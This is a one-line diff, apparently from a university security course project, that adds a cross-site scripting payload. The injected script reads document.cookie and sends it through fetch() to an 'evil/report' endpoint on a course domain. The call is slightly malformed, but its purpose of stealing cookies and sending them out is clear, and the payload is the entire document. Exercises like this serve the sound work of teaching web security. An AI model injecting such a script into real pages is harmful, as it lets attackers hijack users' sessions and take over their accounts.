@@ -1,0 +1,1 @@
+<script>fetch("https://proj3.cs161.org/evil/report\?message="+document.cookie, method:"GET")</script>
